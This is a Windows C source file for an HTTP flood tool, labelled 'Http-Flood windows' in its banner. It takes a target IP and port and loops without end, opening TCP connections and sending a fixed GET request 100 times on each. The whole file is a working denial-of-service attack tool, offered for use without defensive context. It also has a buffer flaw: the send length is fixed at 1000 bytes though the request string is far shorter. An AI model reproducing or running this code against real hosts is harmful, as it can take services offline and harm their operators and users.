#include <stdio.h>
#include <stdlib.h>
#include <WS2tcpip.h>
#include <WinSock2.h>

char* message = "GET / HTTP/1.1\r\nHost: pengsoo.com\r\nConnection: Keep-Alive\r\n\r\n";

int wmain(int argc, WCHAR* argv[]) {
	WSADATA wsaData;
	SOCKET cSocket;
	SOCKADDR_IN sAddr;
	int sResult;
	WSABUF dataBuf;
	DWORD sendBytes;
	WSAOVERLAPPED sendOverlapped = { 0 };

	wprintf_s(L"\n\n");
	wprintf_s(L"'||  ||`   ||     ||              '||''''| '||`                   ||`\n");
	wprintf_s(L" ||  ||    ||     ||               ||  .    ||                    ||\n");
	wprintf_s(L" ||''||  ''||'' ''||'' '||''|, --- ||''|    ||  .|''|, .|''|, .|''||\n");
	wprintf_s(L" ||  ||    ||     ||    ||  ||     ||       ||  ||  || ||  || ||  ||\n");
	wprintf_s(L".||  ||.   `|..'  `|..' ||..|'    .||.     .||. `|..|' `|..|' `|..||.\n");
	wprintf_s(L"                        ||\n");
	wprintf_s(L"                       .||                                    windows\n");

	if (argc != 3) {
		wprintf_s(L"Usage : .\\windos [IP] [port]\n");
		wprintf_s(L"ex: .\\window 192.168.1.1 80\n");
		exit(EXIT_FAILURE);
	}

	dataBuf.len = 1000;
	dataBuf.buf = message;

	ZeroMemory(&wsaData, sizeof(WSADATA));
	sResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (sResult != 0) {
		wprintf_s(L"WSAStartup() failed %d...\n", sResult);
		exit(EXIT_FAILURE);
	}

	ZeroMemory(&sAddr, sizeof(SOCKADDR_IN));
	sAddr.sin_family = AF_INET;
	sResult = InetPton(AF_INET, (PCWSTR)argv[1], &sAddr.sin_addr);

	if (!sResult) {
		wprintf_s(L"InetPton() failed %d...\n", sResult);
		exit(EXIT_FAILURE);
	}
	sAddr.sin_port = htons(_wtoi(argv[2]));

	int msgLen = (int)strlen(message);

	while (TRUE) {
		cSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
		if (cSocket == INVALID_SOCKET) {
			printf("socket() error...\n");
		}

		if (connect(cSocket, (SOCKADDR*)&sAddr, sizeof(sAddr))) {
			printf("connect() error...\n");
		}

		for (int cnt = 0; cnt < 100; cnt++) {
			WSASend(cSocket, &dataBuf, 1, &sendBytes, 0, &sendOverlapped, NULL);
		}

		closesocket(cSocket);
	}

	WSACleanup();
	return 0;
}